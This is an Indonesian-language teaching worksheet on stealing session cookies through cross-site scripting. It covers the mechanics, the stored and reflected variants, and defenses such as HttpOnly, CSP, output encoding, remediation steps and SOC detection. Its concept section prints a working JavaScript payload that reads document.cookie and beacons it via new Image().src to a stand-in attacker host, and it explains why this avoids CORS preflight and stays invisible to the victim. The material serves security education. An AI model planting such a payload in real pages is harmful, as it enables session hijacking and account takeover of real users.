Sheet 01 · Topic Introduction

Pengenalan XSS Cookie Theft Mechanics

Saat Cookie Sesi Menjadi “Kunci Emas” Bagi Penyerang.

Protokol HTTP bersifat stateless—ia tidak memiliki ingatan bawaan antar-permintaan. Untuk menjaga pengguna tetap login, web server menerbitkan Session ID yang disimpan dalam cookie peramban. Namun, ketika aplikasi web memiliki celah Cross-Site Scripting (XSS), peramban korban dipaksa mengeksekusi skrip jahat yang membaca dan mengirimkan cookie tersebut langsung ke tangan peretas.

CWE-79: Cross-Site Scripting CWE-1004: Cookie tanpa HttpOnly DOM document.cookie Mitigasi: HttpOnly & CSP

Spesifikasi · Definisi
Pencurian Cookie via XSS adalah teknik pembajakan sesi di mana penyerang menyisipkan skrip berbahaya ke aplikasi web untuk mengeksekusi JavaScript pada peramban korban, membaca properti document.cookie, dan mengeksfiltrasi token sesi ke server penyerang.

INJEKSI XSS BACA DOM SILUMAN IMAGE() → BAJAK SESI

Tujuan Pembelajaran

  • Memahami sifat stateless HTTP dan peran krusial Session ID pada cookie.
  • Mengidentifikasi celah DOM saat JavaScript diizinkan mengakses document.cookie.
  • Menganalisis trik transmisi siluman Image Beacon yang tidak terhalang preflight CORS.
  • Mensimulasikan pencurian cookie dan impersonation korban secara interaktif.
  • Membedakan Stored XSS dan Reflected XSS beserta cara korban terpicu.
  • Menerapkan mitigasi standar industri: HttpOnly, SameSite, dan CSP.
01.3

Relevansi Keamanan & Catatan Analisis

A03 XSS Termasuk Kategori Injection. OWASP Top 10:2021 menempatkan Cross-Site Scripting dalam kategori A03: Injection 11. XSS dapat terjadi ketika aplikasi menangani atau merender input yang tidak tepercaya secara tidak aman. Cookie tanpa flag HttpOnly berisiko dibaca melalui JavaScript yang berhasil diinjeksi. Sementara itu, SameSite terutama membantu membatasi pengiriman cookie dalam konteks lintas situs untuk mengurangi risiko CSRF.
Risiko Session Hijacking
Token sesi yang masih valid dapat memungkinkan penyerang menyamar sebagai pengguna tanpa memasukkan ulang password. Namun, dampaknya bergantung pada mekanisme autentikasi dan kontrol keamanan aplikasi. MFA tidak selalu melindungi sesi yang telah dicuri. Deteksi anomali, pencabutan sesi, dan autentikasi ulang untuk tindakan sensitif tetap diperlukan.
HTTPS Saja Tidak Cukup. HTTPS melindungi kerahasiaan dan integritas data selama transmisi antara browser dan server. Namun, HTTPS tidak otomatis mencegah XSS. Jika aplikasi merender input pengguna secara tidak aman, skrip berbahaya tetap dapat dijalankan dalam konteks halaman aplikasi. Oleh karena itu, HTTPS perlu dikombinasikan dengan output encoding, penanganan DOM yang aman, CSP, dan konfigurasi cookie yang tepat.
Sheet 02 · Concept Explanation

Penjelasan Konsep & Mekanisme Kerja DOM

Anatomi Kerentanan DOM

Mengapa JavaScript Bisa Membaca Cookie Anda?

Secara default, Document Object Model (DOM) menyediakan antarmuka document.cookie agar skrip peramban dapat menyimpan preferensi pengguna. Namun, bila token sesi rahasia ditaruh di sana tanpa proteksi khusus, maka skrip yang disuntikkan penyerang dapat mengeksekusi:

// Injeksi JavaScript XSS Jahat
var cookie = document.cookie;
new Image().src = 'http://attacker-c2.id/log?c='
+ encodeURIComponent(cookie);

Trik Siluman "Image Beacon"

Mengapa penyerang memilih new Image().src daripada fetch()?

  • Tanpa Preflight CORS: Permintaan gambar lintas domain (cross-origin GET) diizinkan peramban tanpa preflight OPTIONS. Responsnya memang tidak dapat dibaca skrip, tetapi penyerang tidak perlu membacanya: cookie sudah terkirim lewat query string dan tercatat di access log.
  • Tak Terlihat oleh Pengguna (Stealth): Objek Image dibuat di memori JavaScript tanpa perlu ditempelkan ke pohon HTML. Gambar tidak pernah muncul di layar korban.
  • encodeURIComponent(): Memastikan karakter khusus seperti ; atau = tidak merusak query parameter HTTP GET.
Komponen yang Terlibat
  • Client DOM Peramban Korban: Menjalankan engine JS di mana token sesi aktif berada dalam memori DOM.
  • Vulnerable Web Server Web Target: Gagal menyaring karakter khusus HTML (<, >) sebelum merender halaman.
  • Attacker C2 Listener Penyerang: Server HTTP yang mencatat cookie korban pada access log secara instan.
Varian Serangan

Stored vs Reflected XSS

Stored XSS: payload tersimpan permanen di server (komentar, profil, tiket) dan menyerang setiap korban yang membuka halaman tersebut. Reflected XSS: payload hanya ada di parameter URL yang dipantulkan server, sehingga korban harus memicunya sendiri, misalnya lewat tautan phishing. Dampak pencurian cookie-nya sama.

Dampak CIA Triad

Pencurian cookie sesi terutama menyerang aspek Confidentiality: token otentikasi yang seharusnya rahasia berpindah ke pihak yang tidak berwenang, lalu dipakai untuk mengakses data dan fungsi akun korban.

Layer Classification

Application vs Network Hijacking

Network Hijacking (TCP) membajak nomor urut paket di Layer 4. Sedangkan XSS Cookie Theft bekerja di Layer 7 (Aplikasi): mencuri token autentikasi level HTTP, sehingga penyerang tidak perlu berada di jaringan Wi-Fi/LAN yang sama dengan korban. 13

Sheet 05 · Security Countermeasures

Mekanisme Pertahanan & Hardening Berlapis

05.1

Tiga Lini Pertahanan Cookie & DOM

Lini 1 · Cookie Flag

Atribut HttpOnly

Saat server mengirim header Set-Cookie dengan flag HttpOnly, browser tidak mengizinkan JavaScript sisi klien membaca cookie tersebut melalui document.cookie 10. Namun, skrip XSS masih mungkin berjalan dan melakukan request atas nama pengguna melalui sesi yang aktif. Karena itu, HttpOnly perlu dikombinasikan dengan pencegahan XSS, CSP, dan praktik pengembangan aplikasi yang aman.

Set-Cookie: PHPSESSID=xyz123abc;
  Path=/; Secure; HttpOnly;
  SameSite=Strict
Lini 2 · Skrip Policy

Content Security Policy

Content Security Policy (CSP) adalah header HTTP yang membatasi sumber daya dan skrip yang diizinkan untuk dijalankan oleh browser. Kebijakan seperti script-src dapat membantu membatasi eksekusi skrip yang tidak diizinkan. Namun, efektivitas CSP bergantung pada konfigurasi kebijakannya. CSP merupakan pertahanan tambahan dan tidak menggantikan output encoding maupun penanganan input yang aman. 12

Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  img-src 'self';
Lini 3 · Sanitasi Data

Contextual Output Encoding

Mengubah karakter pembentuk tag HTML (seperti < menjadi &lt;) sebelum merender data ke layar, sehingga peramban memperlakukannya sebagai teks statis9.

htmlspecialchars($input,
  ENT_QUOTES | ENT_HTML5,
  'UTF-8');

05.3

Alur Remediasi Kerentanan (Step-by-Step Fix)

  1. Audit Titik Input & Sink DOM Identifikasi sumber input yang tidak tepercaya dan cara aplikasi merendernya. Periksa penggunaan sink DOM seperti innerHTML dan prioritaskan API yang memperlakukan input sebagai teks, seperti textContent, jika sesuai.
  2. Hardening Konfigurasi Cookie Konfigurasikan cookie sesi dengan atribut HttpOnly, Secure, dan SameSite sesuai kebutuhan aplikasi. Atribut ini memiliki fungsi berbeda dan tidak menggantikan pencegahan XSS.
  3. Implementasi CSP Terapkan header Content-Security-Policy dengan kebijakan yang ketat dan sesuai kebutuhan aplikasi. Hindari penggunaan izin skrip inline yang terlalu longgar dan gunakan nonce atau hash bila sesuai.
  4. Validasi & Regression Test Uji aplikasi pada lingkungan yang diizinkan untuk memastikan input tidak tepercaya ditampilkan secara aman, konfigurasi cookie sesuai harapan, dan kebijakan CSP bekerja. Dokumentasikan hasil pengujian dan perbaiki temuan yang ada.
05.4

Deteksi di Security Operations Center (SOC)

Pembajakan sesi biasanya terlihat sebagai satu token sesi yang tiba-tiba dipakai dari konteks berbeda. Dua indikator utama di SIEM/SOC adalah IP Drift (alamat IP sumber berubah mendadak pada sesi yang sama) dan Diff-UA (User-Agent berbeda pada cookie yang sama). Respons yang disarankan: cabut (invalidate) sesi, paksa login ulang, dan telusuri sink XSS yang menjadi sumber kebocoran.
